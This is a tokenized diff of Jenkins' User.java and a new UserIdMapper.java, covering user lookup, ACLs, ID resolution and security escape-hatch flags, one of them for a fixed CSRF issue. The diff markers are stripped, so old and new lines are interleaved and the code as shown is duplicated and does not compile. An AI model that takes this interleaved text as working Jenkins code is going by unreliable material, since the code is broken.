"AbstractProject", ".", "class", ")", ")", "{", "for", "(", "AbstractBuild", "<", "?,", "?", ">", "b", "=", "p", ".", "getLastBuild", "(", ");", "b", "!", "=", "null", ";", "b", "=", "b", ".", "getPreviousBuild", "(", "))", "{", "if", "(", "relatedTo", "(", "b", ")", ")", "{", "lastBuilds", ".", "add", "(", "b", ")", ";", "break", ";", "@", "@", "-", "980", ",", "44", "+", "905", ",", "22", "@", "@", "public", "void", "doRssLatest", "(", "StaplerRequest", "req", ",", "StaplerResponse", "rsp", ")", "throws", "IOExcept", "}", "/", "/", "historically", "these", "have", "been", "reported", "sorted", "by", "project", "name", ",", "we", "switched", "to", "the", "lazy", "iteration", "/", "/", "so", "we", "only", "have", "to", "sort", "the", "sublist", "of", "runs", "rather", "than", "the", "full", "list", "of", "irrelevant", "projects", "Collections", ".", "sort", "(", "lastBuilds", ",", "new", "Comparator", "<", "Run", ">", "()", "{", "@", "Override", "public", "int", "compare", "(", "Run", "o1", ",", "Run", "o2", ")", "{", "return", "Items", ".", "BY_FULL_NAME", ".", "compare", "(", "o1", ".", "getParent", "(", "),", "o2", ".", "getParent", "(", "))", ";", "}", "}", ");", "lastBuilds", ".", "sort", "(", "(", "o1", ",", "o2", ")", "-", ">", "Items", ".", "BY_FULL_NAME", ".", "compare", "(", "o1", ".", "getParent", "(", "),", "o2", ".", "getParent", "(", "))", ");", "rss", "(", "req", ",", "rsp", ",", "\"", "latest", "build", "\"", ",", "RunList", ".", "fromRuns", "(", "lastBuilds", ")", ",", "Run", ".", "FEED_ADAPTER_LATEST", ")", ";", "}", "private", "void", "rss", "(", "StaplerRequest", "req", ",", "StaplerResponse", "rsp", ",", "String", "suffix", ",", "RunList", "runs", ",", "FeedAdapter", "adapter", ")", "throws", "IOException", ",", "ServletException", "{", "RSS", ".", "forwardToRss", "(", "getDisplayName", "(", ")+", "suffix", ",", "getUrl", "(", "),", "runs", ".", "newBuilds", "(", "),", "adapter", ",", "req", ",", "rsp", ")", ";", "}", "/", "**", "*", "This", "lock", "is", "used", "to", "guard", "access", "to", "the", "{", "@", "link", "AllUsers", "#", "byName", "}", "map", ".", "Use", "*", "{", "@", "link", "java", ".", "util", ".", "concurrent", ".", "locks", ".", "ReadWriteLock", "#", "readLock", "(", ")}", "for", "normal", "access", "and", "*", "{", "@", "link", "java", ".", "util", ".", "concurrent", ".", "locks", ".", "ReadWriteLock", "#", "writeLock", "(", ")}", "for", "{", "@", "link", "#", "rekey", "(", ")}", "or", "any", "other", "operation", "*", "that", "requires", "operating", "on", "the", "map", "as", "a", "whole", ".", "*", "/", "private", "static", "final", "ReadWriteLock", "byNameLock", "=", "new", "ReentrantReadWriteLock", "(", ");", "/", "**", "*", "Used", "to", "load", "/", "save", "user", "configuration", ".", "*", "/", "public", "static", "final", "XStream2", "XSTREAM", "=", "new", "XStream2", "(", ");", "private", "static", "final", "Logger", "LOGGER", "=", "Logger", ".", "getLogger", "(", "User", ".", "class", ".", "getName", "(", "))", ";", "static", "{", "XSTREAM", ".", "alias", "(", "\"", "user", "\"", ",", "User", ".", "class", ")", ";", "RSS", ".", "forwardToRss", "(", "getDisplayName", "(", ")", "+", "suffix", ",", "getUrl", "(", "),", "runs", ".", "newBuilds", "(", "),", "adapter", ",", "req", ",", "rsp", ")", ";", "}", "@", "Override", "@", "Nonnull", "public", "ACL", "getACL", "(", ")", "{", "ACL", "base", "=", "Jenkins", ".", "getInstance", "(", ").", "getAuthorizationStrategy", "(", ").", "getACL", "(", "this", ")", ";", "ACL", "base", "=", "Jenkins", ".", "get", "(", ").", "getAuthorizationStrategy", "(", ").", "getACL", "(", "this", ")", ";", "/", "/", "always", "allow", "a", "non", "-", "anonymous", "user", "full", "control", "of", "himself", ".", "return", "ACL", ".", "lambda", "(", "(", "a", ",", "permission", ")", "-", ">", "(", "idStrategy", "(", ").", "equals", "(", "a", ".", "getName", "(", "),", "id", ")", "&", "&", "!", "(", "a", "instanceof", "AnonymousAuthenticationToken", ")", ")", "|", "|", "base", ".", "hasPermission", "(", "a", ",", "permission", ")", ");", "|", "|", "base", ".", "hasPermission", "(", "a", ",", "permission", ")", ");", "}", "/", "**", "@", "@", "-", "1026", ",", "21", "+", "929", ",", "23", "@", "@", "public", "ACL", "getACL", "(", ")", "{", "public", "boolean", "canDelete", "(", ")", "{", "final", "IdStrategy", "strategy", "=", "idStrategy", "(", ");", "return", "hasPermission", "(", "Jenkins", ".", "ADMINISTER", ")", "&", "&", "!", "strategy", ".", "equals", "(", "id", ",", "Jenkins", ".", "getAuthentication", "(", ").", "getName", "(", "))", "&", "&", "new", "File", "(", "getRootDir", "(", "),", "strategy", ".", "filenameOf", "(", "id", ")", ").", "exists", "(", ");", "&", "&", "UserIdMapper", ".", "getInstance", "(", ").", "isMapped", "(", "id", ")", ";", "}", "/", "**", "*", "Checks", "for", "authorities", "(", "groups", ")", "associated", "with", "this", "user", ".", "*", "If", "the", "caller", "lacks", "{", "@", "link", "Jenkins", "#", "ADMINISTER", "}", ",", "or", "any", "problems", "arise", ",", "returns", "an", "empty", "list", ".", "*", "{", "@", "link", "SecurityRealm", "#", "AUTHENTICATED_AUTHORITY", "}", "and", "the", "username", ",", "if", "present", ",", "are", "omitted", ".", "*", "@", "since", "1", ".", "498", "*", "*", "@", "return", "a", "possibly", "empty", "list", "*", "@", "since", "1", ".", "498", "*", "/", "public", "@", "Nonnull", "List", "<", "String", ">", "getAuthorities", "(", ")", "{", "if", "(", "!", "Jenkins", ".", "getInstance", "(", ").", "hasPermission", "(", "Jenkins", ".", "ADMINISTER", ")", ")", "{", "public", "@", "Nonnull", "List", "<", "String", ">", "getAuthorities", "(", ")", "{", "if", "(", "!", "Jenkins", ".", "get", "(", ").", "hasPermission", "(", "Jenkins", ".", "ADMINISTER", ")", ")", "{", "return", "Collections", ".", "emptyList", "(", ");", "}", "List", "<", "String", ">", "r", "=", "new", "ArrayList", "<", "String", ">", "()", ";", "List", "<", "String", ">", "r", "=", "new", "ArrayList", "<", ">(", ");", "Authentication", "authentication", ";", "try", "{", "authentication", "=", "impersonate", "(", ");", "@", "@", "-", "1057", ",", "59", "+", "962", ",", "59", "@", "@", "public", "boolean", "canDelete", "(", ")", "{", "r", ".", "add", "(", "n", ")", ";", "}", "}", "Collections", ".", "sort", "(", "r", ",", "String", ".", "CASE_INSENSITIVE_ORDER", ")", ";", "r", ".", "sort", "(", "String", ".", "CASE_INSENSITIVE_ORDER", ")", ";", "return", "r", ";", "}", "public", "Object", "getDynamic", "(", "String", "token", ")", "{", "for", "(", "Action", "action", ":", "getTransientActions", "(", "))", "{", "if", "(", "Objects", ".", "equals", "(", "action", ".", "getUrlName", "(", "),", "token", ")", ")", "for", "(", "Action", "action", ":", "getTransientActions", "(", "))", "{", "if", "(", "Objects", ".", "equals", "(", "action", ".", "getUrlName", "(", "),", "token", ")", ")", "return", "action", ";", "}", "for", "(", "Action", "action", ":", "getPropertyActions", "(", "))", "{", "if", "(", "Objects", ".", "equals", "(", "action", ".", "getUrlName", "(", "),", "token", ")", ")", "for", "(", "Action", "action", ":", "getPropertyActions", "(", "))", "{", "if", "(", "Objects", ".", "equals", "(", "action", ".", "getUrlName", "(", "),", "token", ")", ")", "return", "action", ";", "}", "return", "null", ";", "}", "/", "**", "*", "Return", "all", "properties", "that", "are", "also", "actions", ".", "*", "*", "*", "@", "return", "the", "list", "can", "be", "empty", "but", "never", "null", ".", "read", "only", ".", "*", "/", "public", "List", "<", "Action", ">", "getPropertyActions", "(", ")", "{", "List", "<", "Action", ">", "actions", "=", "new", "ArrayList", "<", "Action", ">", "()", ";", "List", "<", "Action", ">", "actions", "=", "new", "ArrayList", "<", ">(", ");", "for", "(", "UserProperty", "userProp", ":", "getProperties", "(", ").", "values", "(", "))", "{", "if", "(", "userProp", "instanceof", "Action", ")", "{", "actions", ".", "add", "(", "(", "Action", ")", "userProp", ")", ";", "}", "}", "return", "Collections", ".", "unmodifiableList", "(", "actions", ")", ";", "}", "/", "**", "*", "Return", "all", "transient", "actions", "associated", "with", "this", "user", ".", "*", "*", "*", "@", "return", "the", "list", "can", "be", "empty", "but", "never", "null", ".", "read", "only", ".", "*", "/", "public", "List", "<", "Action", ">", "getTransientActions", "(", ")", "{", "List", "<", "Action", ">", "actions", "=", "new", "ArrayList", "<", "Action", ">", "()", ";", "for", "(", "TransientUserActionFactory", "factory", ":", "TransientUserActionFactory", ".", "all", "(", "))", "{", "List", "<", "Action", ">", "actions", "=", "new", "ArrayList", "<", ">(", ");", "for", "(", "TransientUserActionFactory", "factory", ":", "TransientUserActionFactory", ".", "all", "(", "))", "{", "actions", ".", "addAll", "(", "factory", ".", "createFor", "(", "this", ")", ");", "}", "return", "Collections", ".", "unmodifiableList", "(", "actions", ")", ";", "}", "public", "ContextMenu", "doContextMenu", "(", "StaplerRequest", "request", ",", "StaplerResponse", "response", ")", "throws", "Exception", "{", "return", "new", "ContextMenu", "(", ").", "from", "(", "this", ",", "request", ",", "response", ")", ";", "return", "new", "ContextMenu", "(", ").", "from", "(", "this", ",", "request", ",", "response", ")", ";", "}", "@", "Override", "@", "Restricted", "(", "NoExternalUse", ".", "class", ")", "public", "Object", "getTarget", "(", ")", "{", "if", "(", "!", "SKIP_PERMISSION_CHECK", ")", "{", "if", "(", "!", "Jenkins", ".", "getInstance", "(", ").", "hasPermission", "(", "Jenkins", ".", "READ", ")", ")", "{", "if", "(", "!", "Jenkins", ".", "get", "(", ").", "hasPermission", "(", "Jenkins", ".", "READ", ")", ")", "{", "/", "/", "work", "around", "Stapler", "bug", "when", "returning", "null", "from", "getTarget", "(", ")", "try", "{", "Stapler", ".", "getCurrentResponse", "(", ").", "sendError", "(", "SC_NOT_FOUND", ")", ";", "/", "/", "send", "same", "response", "body", "Stapler", "would", "send", "@", "@", "-", "1121", ",", "71", "+", "1026", ",", "96", "@", "@", "public", "Object", "getTarget", "(", ")", "{", "return", "this", ";", "}", "/", "**", "*", "Escape", "hatch", "for", "StaplerProxy", "-", "based", "access", "control", "*", "/", "@", "Restricted", "(", "NoExternalUse", ".", "class", ")", "public", "static", "/", "*", "Script", "Console", "modifiable", "*", "/", "boolean", "SKIP_PERMISSION_CHECK", "=", "Boolean", ".", "getBoolean", "(", "User", ".", "class", ".", "getName", "(", ")", "+", "\"", ".", "skipPermissionCheck", "\"", ");", "/", "**", "*", "Gets", "list", "of", "Illegal", "usernames", ",", "for", "which", "users", "should", "not", "be", "created", ".", "*", "Always", "includes", "users", "from", "{", "@", "link", "#", "ILLEGAL_PERSISTED_USERNAMES", "}", "*", "*", "@", "return", "List", "of", "usernames", "*", "/", "@", "Restricted", "(", "NoExternalUse", ".", "class", ")", "/", "*", "package", "*", "/", "static", "Set", "<", "String", ">", "getIllegalPersistedUsernames", "(", ")", "{", "/", "/", "TODO", ":", "This", "method", "is", "designed", "for", "further", "extensibility", "via", "system", "properties", ".", "To", "be", "extended", "in", "a", "follow", "-", "up", "issue", "final", "Set", "<", "String", ">", "res", "=", "new", "HashSet", "<", ">(", ");", "res", ".", "addAll", "(", "Arrays", ".", "asList", "(", "ILLEGAL_PERSISTED_USERNAMES", ")", ");", "return", "res", ";", "return", "new", "HashSet", "<", ">(", "Arrays", ".", "asList", "(", "ILLEGAL_PERSISTED_USERNAMES", ")", ");", "}", "private", "Object", "writeReplace", "(", ")", "{", "return", "XmlFile", ".", "replaceIfNotAtTopLevel", "(", "this", ",", "(", ")", "-", ">", "new", "Replacer", "(", "this", ")", ");", "}", "private", "static", "class", "Replacer", "{", "private", "final", "String", "id", ";", "Replacer", "(", "User", "u", ")", "{", "id", "=", "u", ".", "getId", "(", ");", "}", "private", "Object", "readResolve", "(", ")", "{", "return", "getById", "(", "id", ",", "false", ")", ";", "}", "}", "/", "**", "Per", "-", "{@", "link", "Jenkins", "}", "holder", "of", "all", "known", "{", "@", "link", "User", "}", "s", ".", "*", "/", "/", "**", "*", "Per", "-", "{@", "link", "Jenkins", "}", "holder", "of", "all", "known", "{", "@", "link", "User", "}", "s", ".", "*", "/", "@", "Extension", "@", "Restricted", "(", "NoExternalUse", ".", "class", ")", "public", "static", "final", "class", "AllUsers", "{", "@", "Initializer", "(", "after", "=", "InitMilestone", ".", "JOB_LOADED", ")", "/", "/", "so", "Jenkins", ".", "loadConfig", "has", "been", "called", "private", "final", "ConcurrentMap", "<", "String", ",", "User", ">", "byName", "=", "new", "ConcurrentHashMap", "<", ">(", ");", "@", "Initializer", "(", "after", "=", "InitMilestone", ".", "JOB_LOADED", ")", "public", "static", "void", "scanAll", "(", ")", "{", "IdStrategy", "strategy", "=", "idStrategy", "(", ");", "File", "[", "]", "subdirs", "=", "getRootDir", "(", ").", "listFiles", "(", "(", "FileFilter", ")", "DirectoryFileFilter", ".", "INSTANCE", ")", ";", "if", "(", "subdirs", "!", "=", "null", ")", "{", "for", "(", "File", "subdir", ":", "subdirs", ")", "{", "File", "configFile", "=", "new", "File", "(", "subdir", ",", "\"", "config", ".", "xml", "\"", ");", "if", "(", "configFile", ".", "exists", "(", "))", "{", "String", "name", "=", "strategy", ".", "idFromFilename", "(", "subdir", ".", "getName", "(", "))", ";", "getOrCreate", "(", "name", ",", "/", "*", "<", "init", ">", "calls", "load", "(", "),", "probably", "clobbering", "this", "anyway", "*", "/", "name", ",", "true", ",", "configFile", ")", ";", "}", "}", "for", "(", "String", "userId", ":", "UserIdMapper", ".", "getInstance", "(", ").", "getConvertedUserIds", "(", "))", "{", "User", "user", "=", "new", "User", "(", "userId", ",", "userId", ")", ";", "getInstance", "(", ").", "byName", ".", "putIfAbsent", "(", "idStrategy", "(", ").", "keyFor", "(", "userId", ")", ",", "user", ")", ";", "}", "}", "@", "GuardedBy", "(", "\"", "User", ".", "byNameLock", "\"", ")", "private", "final", "ConcurrentMap", "<", "String", ",", "User", ">", "byName", "=", "new", "ConcurrentHashMap", "<", "String", ",", "User", ">", "()", ";", "/", "**", "*", "Keyed", "by", "{", "@", "link", "User", "#", "id", "}", ".", "This", "map", "is", "used", "to", "ensure", "*", "singleton", "-", "per", "-", "id", "semantics", "of", "{", "@", "link", "User", "}", "objects", ".", "*", "*", "<", "p", ">", "*", "The", "key", "needs", "to", "be", "generated", "by", "{", "@", "link", "IdStrategy", "#", "keyFor", "(", "String", ")", "}.", "*", "/", "@", "GuardedBy", "(", "\"", "User", ".", "byNameLock", "\"", ")", "static", "ConcurrentMap", "<", "String", ",", "User", ">", "byName", "(", ")", "{", "return", "ExtensionList", ".", "lookupSingleton", "(", "AllUsers", ".", "class", ")", ".", "byName", ";", "private", "static", "AllUsers", "getInstance", "(", ")", "{", "return", "ExtensionList", ".", "lookupSingleton", "(", "AllUsers", ".", "class", ")", ";", "}", "private", "static", "void", "reload", "(", ")", "{", "getInstance", "(", ").", "byName", ".", "clear", "(", ");", "UserDetailsCache", ".", "get", "(", ").", "invalidateAll", "(", ");", "scanAll", "(", ");", "}", "private", "static", "void", "clear", "(", ")", "{", "getInstance", "(", ").", "byName", ".", "clear", "(", ");", "}", "private", "static", "void", "remove", "(", "String", "id", ")", "{", "getInstance", "(", ").", "byName", ".", "remove", "(", "idStrategy", "(", ").", "keyFor", "(", "id", ")", ");", "}", "private", "static", "User", "get", "(", "String", "id", ")", "{", "return", "getInstance", "(", ").", "byName", ".", "get", "(", "idStrategy", "(", ").", "keyFor", "(", "id", ")", ");", "}", "private", "static", "void", "put", "(", "String", "id", ",", "User", "user", ")", "{", "getInstance", "(", ").", "byName", ".", "putIfAbsent", "(", "idStrategy", "(", ").", "keyFor", "(", "id", ")", ",", "user", ")", ";", "}", "private", "static", "Collection", "<", "User", ">", "values", "(", ")", "{", "return", "getInstance", "(", ").", "byName", ".", "values", "(", ");", "}", "}", "/", "**", "*", "Resolves", "User", "IDs", "by", "ID", ",", "full", "names", "or", "other", "strings", ".", "*", "*", "<", "p", ">", "*", "This", "extension", "point", "may", "be", "useful", "to", "map", "SCM", "user", "names", "to", "Jenkins", "{", "@", "link", "User", "}", "IDs", ".", "*", "Currently", "the", "extension", "point", "is", "used", "in", "{", "@", "link", "User", "#", "get", "(", "String", ",", "boolean", ",", "Map", ")", "}.", "*", "*", "@", "since", "1", ".", "479", "*", "@", "see", "jenkins", ".", "model", ".", "DefaultUserCanonicalIdResolver", "*", "@", "see", "FullNameIdResolver", "*", "@", "since", "1", ".", "479", "*", "/", "public", "static", "abstract", "class", "CanonicalIdResolver", "extends", "AbstractDescribableImpl", "<", "CanonicalIdResolver", ">", "implements", "ExtensionPoint", ",", "Comparable", "<", "CanonicalIdResolver", ">", "{", "@", "@", "-", "1197", ",", "23", "+", "1127", ",", "22", "@", "@", "public", "static", "void", "scanAll", "(", ")", "{", "public", "static", "final", "String", "REALM", "=", "\"", "realm", "\"", ";", "@", "Override", "public", "int", "compareTo", "(", "CanonicalIdResolver", "o", ")", "{", "public", "int", "compareTo", "(", "@", "Nonnull", "CanonicalIdResolver", "o", ")", "{", "/", "/", "reverse", "priority", "order", "int", "i", "=", "getPriority", "(", ");", "int", "j", "=", "o", ".", "getPriority", "(", ");", "return", "i", ">", "j", "?", "-", "1", ":", "(", "i", "=", "=", "j", "?", "0", ":", "1", ")", ";", "return", "Integer", ".", "compare", "(", "o", ".", "getPriority", "(", "),", "getPriority", "(", "))", ";", "}", "/", "**", "*", "extract", "user", "ID", "from", "idOrFullName", "with", "help", "from", "contextual", "infos", ".", "*", "can", "return", "<", "code", ">", "null", "<", "/", "code", ">", "if", "no", "user", "ID", "matched", "the", "input", "*", "/", "public", "abstract", "@", "CheckForNull", "String", "resolveCanonicalId", "(", "String", "idOrFullName", ",", "@", "Nonnull", "Map", "<", "String", ",", "?", ">", "context", ")", ";", "public", "abstract", "@", "CheckForNull", "String", "resolveCanonicalId", "(", "String", "idOrFullName", ",", "Map", "<", "String", ",", "?", ">", "context", ")", ";", "/", "**", "*", "Gets", "priority", "of", "the", "resolver", ".", "*", "Higher", "priority", "means", "that", "it", "will", "be", "checked", "earlier", ".", "*", "*", "<", "p", ">", "*", "Overriding", "methods", "must", "not", "use", "{", "@", "link", "Integer", "#", "MIN_VALUE", "}", ",", "because", "it", "will", "cause", "collisions", "*", "with", "{", "@", "link", "jenkins", ".", "model", ".", "DefaultUserCanonicalIdResolver", "}", ".", "*", "@", "@", "-", "1223", ",", "10", "+", "1152", ",", "11", "@", "@", "public", "int", "getPriority", "(", ")", "{", "return", "1", ";", "}", "/", "/", "TODO", ":", "It", "is", "too", "late", "to", "use", "Extension", "Point", "ordinals", ",", "right", "?", "/", "/", "Such", "sorting", "and", "collection", "rebuild", "is", "not", "good", "for", "User", "#", "get", "(", "..", ".)", "method", "performance", ".", "/", "**", "*", "Gets", "all", "extension", "points", ",", "sorted", "by", "priority", ".", "*", "*", "@", "return", "Sorted", "list", "of", "extension", "point", "implementations", ".", "*", "@", "since", "2", ".", "93", "*", "/", "@", "@", "-", "1238", ",", "18", "+", "1168", ",", "18", "@", "@", "public", "int", "getPriority", "(", ")", "{", "/", "**", "*", "Resolves", "users", "using", "all", "available", "{", "@", "link", "CanonicalIdResolver", "}", "s", ".", "*", "*", "@", "param", "idOrFullName", "ID", "or", "full", "name", "of", "the", "user", "*", "@", "param", "context", "Context", "*", "@", "param", "context", "Context", "*", "@", "return", "Resolved", "User", "ID", "or", "{", "@", "code", "null", "}", "if", "the", "user", "ID", "cannot", "be", "resolved", ".", "*", "@", "since", "2", ".", "93", "*", "/", "@", "CheckForNull", "public", "static", "String", "resolve", "(", "@", "Nonnull", "String", "idOrFullName", ",", "@", "Nonnull", "Map", "<", "String", ",", "?", ">", "context", ")", "{", "for", "(", "CanonicalIdResolver", "resolver", ":", "CanonicalIdResolver", ".", "all", "(", "))", "{", "/", "/", "TODO", ":", "add", "try", "/", "catch", "for", "Runtime", "exceptions", "?", "It", "should", "not", "happen", "now", "&", "&", "it", "may", "cause", "performance", "degradation", "String", "id", "=", "resolver", ".", "resolveCanonicalId", "(", "idOrFullName", ",", "context", ")", ";", "if", "(", "id", "!", "=", "null", ")", "{", "LOGGER", ".", "log", "(", "Level", ".", "FINE", ",", "\"", "{", "0", "}", "mapped", "{", "1", "}", "to", "{", "2", "}", "\",", "new", "Object", "[", "]", "{", "resolver", ",", "idOrFullName", ",", "id", "}", ");", "LOGGER", ".", "log", "(", "Level", ".", "FINE", ",", "\"", "{", "0", "}", "mapped", "{", "1", "}", "to", "{", "2", "}", "\",", "new", "Object", "[", "]{", "resolver", ",", "idOrFullName", ",", "id", "}", ");", "return", "id", ";", "}", "}", "@", "@", "-", "1264", ",", "7", "+", "1194", ",", "8", "@", "@", "public", "static", "String", "resolve", "(", "@", "Nonnull", "String", "idOrFullName", ",", "@", "Nonnull", "Map", "<", "String", ",", "/", "**", "*", "Resolve", "user", "ID", "from", "full", "name", "*", "/", "@", "Extension", "@", "Symbol", "(", "\"", "fullName", "\"", ")", "@", "Extension", "@", "Symbol", "(", "\"", "fullName", "\"", ")", "public", "static", "class", "FullNameIdResolver", "extends", "CanonicalIdResolver", "{", "@", "Override", "@", "@", "-", "1290", ",", "15", "+", "1221", ",", "10", "@", "@", "public", "int", "getPriority", "(", ")", "{", "@", "Restricted", "(", "NoExternalUse", ".", "class", ")", "public", "static", "class", "UserIDCanonicalIdResolver", "extends", "User", ".", "CanonicalIdResolver", "{", "private", "static", "/", "*", "not", "final", "*", "/", "boolean", "SECURITY_243_FULL_DEFENSE", "=", "private", "static", "/", "*", "not", "final", "*", "/", "boolean", "SECURITY_243_FULL_DEFENSE", "=", "SystemProperties", ".", "getBoolean", "(", "User", ".", "class", ".", "getName", "(", ")", "+", "\"", ".", "SECURITY_243_FULL_DEFENSE", "\"", ",", "true", ")", ";", "private", "static", "final", "ThreadLocal", "<", "Boolean", ">", "resolving", "=", "new", "ThreadLocal", "<", "Boolean", ">", "()", "{", "@", "Override", "protected", "Boolean", "initialValue", "(", ")", "{", "return", "false", ";", "}", "}", ";", "private", "static", "final", "ThreadLocal", "<", "Boolean", ">", "resolving", "=", "ThreadLocal", ".", "withInitial", "(", "()", "-", ">", "false", ")", ";", "@", "Override", "public", "String", "resolveCanonicalId", "(", "String", "idOrFullName", ",", "Map", "<", "String", ",", "?", ">", "context", ")", "{", "@", "@", "-", "1332", ",", "30", "+", "1258", ",", "4", "@", "@", "public", "int", "getPriority", "(", ")", "{", "}", "/", "**", "*", "Jenkins", "now", "refuses", "to", "let", "the", "user", "login", "if", "he", "/", "she", "doesn", "'", "t", "exist", "in", "{", "@", "link", "SecurityRealm", "}", ",", "*", "which", "was", "necessary", "to", "make", "sure", "users", "removed", "from", "the", "backend", "will", "get", "removed", "from", "the", "frontend", ".", "*", "<", "p", ">", "*", "Unfortunately", "this", "infringed", "some", "legitimate", "use", "cases", "of", "creating", "Jenkins", "-", "local", "users", "for", "*", "automation", "purposes", ".", "This", "escape", "hatch", "switch", "can", "be", "enabled", "to", "resurrect", "that", "behaviour", ".", "*", "*", "JENKINS", "-", "22346", ".", "*", "/", "public", "static", "boolean", "ALLOW_NON_EXISTENT_USER_TO_LOGIN", "=", "SystemProperties", ".", "getBoolean", "(", "User", ".", "class", ".", "getName", "(", ")+", "\".", "allowNonExistentUserToLogin", "\"", ");", "/", "**", "*", "Jenkins", "historically", "created", "a", "(", "usually", ")", "ephemeral", "user", "record", "when", "an", "user", "with", "Overall", "/", "Administer", "permission", "*", "accesses", "a", "/", "user", "/", "arbitraryName", "URL", ".", "*", "<", "p", ">", "*", "Unfortunately", "this", "constitutes", "a", "CSRF", "vulnerability", ",", "as", "malicious", "users", "can", "make", "admins", "create", "arbitrary", "numbers", "*", "of", "ephemeral", "user", "records", ",", "so", "the", "behavior", "was", "changed", "in", "Jenkins", "2", ".", "TODO", "/", "2", ".", "32", ".", "2", ".", "*", "<", "p", ">", "*", "As", "some", "users", "may", "be", "relying", "on", "the", "previous", "behavior", ",", "setting", "this", "to", "true", "restores", "the", "previous", "behavior", ".", "This", "*", "is", "not", "recommended", ".", "*", "*", "SECURITY", "-", "406", ".", "*", "/", "@", "Restricted", "(", "NoExternalUse", ".", "class", ")", "public", "static", "boolean", "ALLOW_USER_CREATION_VIA_URL", "=", "SystemProperties", ".", "getBoolean", "(", "User", ".", "class", ".", "getName", "(", ")", "+", "\"", ".", "allowUserCreationViaUrl", "\"", ");", "}", "@", "@", "-", "0", ",", "0", "+", "1", ",", "201", "@", "@", "/", "*", "*", "The", "MIT", "License", "*", "*", "Copyright", "2018", "CloudBees", ",", "Inc", ".", "*", "*", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "*", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "*", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "*", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "*", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "*", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "*", "*", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "*", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "*", "*", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "*", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "*", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "*", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "*", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "*", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "*", "THE", "SOFTWARE", ".", "*", "/", "package", "hudson", ".", "model", ";", "import", "hudson", ".", "Extension", ";", "import", "hudson", ".", "ExtensionList", ";", "import", "hudson", ".", "Util", ";", "import", "hudson", ".", "XmlFile", ";", "import", "hudson", ".", "init", ".", "InitMilestone", ";", "import", "hudson", ".", "init", ".", "Initializer", ";", "import", "hudson", ".", "util", ".", "XStream2", ";", "import", "jenkins", ".", "model", ".", "IdStrategy", ";", "import", "org", ".", "kohsuke", ".", "accmod", ".", "Restricted", ";", "import", "org", ".", "kohsuke", ".", "accmod", ".", "restrictions", ".", "NoExternalUse", ";", "import", "java", ".", "io", ".", "File", ";", "import", "java", ".", "io", ".", "IOException", ";", "import", "java", ".", "nio", ".", "file", ".", "Files", ";", "import", "java", ".", "nio", ".", "file", ".", "NoSuchFileException", ";", "import", "java", ".", "nio", ".", "file", ".", "Path", ";", "import", "java", ".", "util", ".", "Collections", ";", "import", "java", ".", "util", ".", "Map", ";", "import", "java", ".", "util", ".", "Set", ";", "import", "java", ".", "util", ".", "concurrent", ".", "ConcurrentHashMap", ";", "import", "java", ".", "util", ".", "logging", ".", "Level", ";", "import", "java", ".", "util", ".", "logging", ".", "Logger", ";", "import", "java", ".", "util", ".", "regex", ".", "Pattern", ";", "@", "Restricted", "(", "NoExternalUse", ".", "class", ")", "@", "Extension", "public", "class", "UserIdMapper", "{", "private", "static", "final", "XStream2", "XSTREAM", "=", "new", "XStream2", "(", ");", "static", "final", "String", "MAPPING_FILE", "=", "\"", "users", ".", "xml", "\"", ";", "private", "static", "final", "Logger", "LOGGER", "=", "Logger", ".", "getLogger", "(", "UserIdMapper", ".", "class", ".", "getName", "(", "))", ";", "private", "static", "final", "int", "PREFIX_MAX", "=", "15", ";", "private", "static", "final", "Pattern", "PREFIX_PATTERN", "=", "Pattern", ".", "compile", "(", "\"[", "^", "A", "-", "Za", "-", "z0", "-", "9", "]", "\")", ";", "private", "final", "int", "version", "=", "1", ";", "/", "/", "Not", "currently", "used", ",", "but", "it", "may", "be", "helpful", "in", "the", "future", "to", "store", "a", "version", ".", "private", "transient", "File", "usersDirectory", ";", "private", "Map", "<", "String", ",", "String", ">", "idToDirectoryNameMap", "=", "new", "ConcurrentHashMap", "<", ">(", ");", "static", "UserIdMapper", "getInstance", "(", ")", "{", "return", "ExtensionList", ".", "lookupSingleton", "(", "UserIdMapper", ".", "class", ")", ";", "}", "public", "UserIdMapper", "(", ")", "{", "}", "@", "Initializer", "(", "after", "=", "InitMilestone", ".", "PLUGINS_STARTED", ",", "before", "=", "InitMilestone", ".", "JOB_LOADED", ")", "public", "File", "init", "(", ")", "throws", "IOException", "{", "usersDirectory", "=", "createUsersDirectoryAsNeeded", "(", ");", "load", "(", ");", "return", "usersDirectory", ";", "}", "File", "getDirectory", "(", "String", "userId", ")", "{", "String", "directoryName", "=", "idToDirectoryNameMap", ".", "get", "(", "getIdStrategy", "(", ").", "keyFor", "(", "userId", ")", ");", "return", "directoryName", "=", "=", "null", "?", "null", ":", "new", "File", "(", "usersDirectory", ",", "directoryName", ")", ";", "}", "File", "putIfAbsent", "(", "String", "userId", ",", "boolean", "saveToDisk", ")", "throws", "IOException", "{", "String", "idKey", "=", "getIdStrategy", "(", ").", "keyFor", "(", "userId", ")", ";", "String", "directoryName", "=", "idToDirectoryNameMap", ".", "get", "(", "idKey", ")", ";", "File", "directory", "=", "null", ";", "if", "(", "directoryName", "=", "=", 